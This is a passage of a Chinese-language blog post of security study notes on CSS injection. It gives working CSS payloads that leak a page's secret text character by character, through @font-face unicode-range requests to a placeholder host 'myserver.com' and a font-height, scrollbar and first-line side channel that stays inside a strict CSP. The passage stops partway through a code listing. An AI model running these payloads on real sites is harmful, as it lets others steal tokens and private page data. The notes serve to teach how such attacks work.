<h2 id="偷其他东西"><a href="#偷其他东西" class="headerlink" title="偷其他东西"></a>偷其他东西</h2><h3 id="unicode-range"><a href="#unicode-range" class="headerlink" title="unicode-range"></a>unicode-range</h3><p>通过这种方法可以偷取到其他元素的东西<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;f1&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=1</span>);</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">31</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;f2&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=2</span>);</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">32</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;f3&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=3</span>);</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">33</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;fa&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=a</span>);</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">61</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;fb&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=b</span>);</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">62</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;fc&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=c</span>);</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">63</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">4em</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: f1, f2, f3, fa, fb, fc;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    Secret: <span class="tag">&lt;<span class="name">div</span>&gt;</span>ca31a<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>执行结果如下<br>chrome:<br><img src="/2023/10/26/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A810-CSS-injection%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>firefox:<br><img src="/2023/10/26/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A810-CSS-injection%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt><br>这种方法在chrome中可能不会按照顺序，但是在firefox中是按照顺序的，从图中还可以看到一个问题，就是他不会重复盗取字符，每种字符只能盗取一次</p>
<h3 id="字体高度差异-scrollbar-first-line"><a href="#字体高度差异-scrollbar-first-line" class="headerlink" title="字体高度差异+scrollbar+first-line"></a>字体高度差异+scrollbar+first-line</h3><ol>
<li><p>字体高度差异<br>假设现在有一种字体 <code>Comic Sans MS</code> ，高度比另一个 <code>Courier New</code> 高。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;fa&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-style</span>:monospace;</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">41</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: fa, <span class="string">&quot;Courier New&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">letter-spacing</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">word-break</span>: break-all;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">overflow-y</span>: auto;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">overflow-x</span>: hidden;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      </span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    Secret: <span class="tag">&lt;<span class="name">div</span>&gt;</span>DBC<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>ABC<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/10/26/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A810-CSS-injection%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/4.png" alt></p>
</li>
<li><p>scrollbar<br>根据css定义，当内容超过容器高度就会出现scrollbar，那么就可以通过给scrollbar设定背景，进行leak</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span>::-webkit-scrollbar &#123;</span><br><span class="line">    <span class="attribute">background</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span>::-webkit-scrollbar:vertical &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>first-line<br>现在的问题就是如何解决顺序问题了。<br>当把div的宽度设置为20（只能显示一个字母），那么其他字母就会被放到第二行，并且把字体尺寸设置为0。接着用first-line这个选择器把第一行的字改为正常尺寸。这样scrollbar的背景图就能正常加载了，说着有点绕，可以看看代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;fa&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-style</span>:monospace;</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">41</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">0px</span>; //尺寸设置为<span class="number">0</span></span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">20px</span>; //宽度只够展示一个字符</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: fa, <span class="string">&quot;Courier New&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">letter-spacing</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">word-break</span>: break-all;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">overflow-y</span>: auto;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">overflow-x</span>: hidden;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">div</span><span class="selector-pseudo">::first-line</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">30px</span>; //用选择器把第一行的字符改为正常的</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    Secret: <span class="tag">&lt;<span class="name">div</span>&gt;</span>CBAD<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>详细demo可以参考这个 <a href="https://demo.vwzq.net/css2.html">https://demo.vwzq.net/css2.html</a></p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        点击显/隐内容
    </div>
    <div class="spoiler-content">
        <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- look mom! no external fonts allowed! --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27;; font-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* comic sans is high (lol) and causes a vertical overflow */</span></span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_A;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">41</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_B;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">42</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_C;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">43</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_D;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">44</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_E;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">45</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_F;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">46</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_G;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">47</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_H;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">48</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_I;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">49</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_J;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">4</span>a;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_K;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">4</span>b;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_L;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">4</span>c;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_M;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">4</span>d;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_N;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">4</span>e;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_O;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">4</span>f;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_P;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">50</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_Q;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">51</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_R;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">52</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_S;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">53</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_T;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">54</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_U;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">55</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_V;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">56</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_W;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">57</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_X;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">58</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_Y;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">59</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_Z;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">5</span>a;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_0;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">30</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_1;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">31</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_2;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">32</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_3;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">33</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_4;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">34</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_5;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">35</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_6;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">36</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_7;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">37</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_8;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">38</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span><span class="selector-pseudo">:has</span>_9;<span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);unicode-range:U+<span class="number">39</span>;<span class="attribute">font-style</span>:monospace;&#125;</span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span>&#123;<span class="attribute">font-family</span>:rest;<span class="attribute">src</span>: <span class="built_in">local</span>(<span class="string">&#x27;Courier New&#x27;</span>);<span class="attribute">font-style</span>:monospace;unicode-range:U+<span class="number">0</span>-<span class="number">10</span>FFFF&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span><span class="selector-class">.leak</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">overflow-y</span>: auto; <span class="comment">/* leak channel */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">overflow-x</span>: hidden; <span class="comment">/* remove false positives */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">40px</span>; <span class="comment">/* comic sans capitals exceed this height */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">0px</span>; <span class="comment">/* make suffix invisible */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">letter-spacing</span>: <span class="number">0px</span>; <span class="comment">/* separation */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">word-break</span>: break-all; <span class="comment">/* small width split words in lines */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-family</span>: rest; <span class="comment">/* default */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: grey; <span class="comment">/* default */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">0px</span>; <span class="comment">/* initial value */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">animation</span>: loop step-end <span class="number">200s</span> <span class="number">0s</span>, trychar step-end <span class="number">2s</span> <span class="number">0s</span>; <span class="comment">/* animations: trychar duration must be 1/100th of loop duration */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">animation-iteration-count</span>: <span class="number">1</span>, infinite; <span class="comment">/* single width iteration, repeat trychar one per width increase (or infinite) */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span><span class="selector-class">.leak</span><span class="selector-pseudo">::first-line</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">30px</span>; <span class="comment">/* prefix is visible in first line */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-transform</span>: uppercase; <span class="comment">/* only capital letters leak */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* iterate over all chars */</span></span></span><br><span class="line"><span class="language-css"><span class="keyword">@keyframes</span> trychar &#123;</span></span><br><span class="line"><span class="language-css">    <span class="number">5%</span> &#123; <span class="attribute">font-family</span>: has_A, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?a</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">6%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">10%</span> &#123; <span class="attribute">font-family</span>: has_B, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?b</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">11%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">15%</span> &#123; <span class="attribute">font-family</span>: has_C, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?c</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">16%</span> &#123; <span class="attribute">font-family</span>: rest &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">20%</span> &#123; <span class="attribute">font-family</span>: has_D, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?d</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">21%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">25%</span> &#123; <span class="attribute">font-family</span>: has_E, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?e</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">26%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">30%</span> &#123; <span class="attribute">font-family</span>: has_F, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?f</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">31%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">35%</span> &#123; <span class="attribute">font-family</span>: has_G, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span class="string">http://127.0.0.1/?g</span>); &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">36%</span> &#123; <span class="attribute">font-family</span>: rest; &#125;</span></span><br><span class="line"><span class="language-css">    <span class="number">40%</span> &#123; <span class="attribute">font-family</span>: has_H, rest; <span class="attr">--leak</span>: <span class="built_in">url</span>(<span 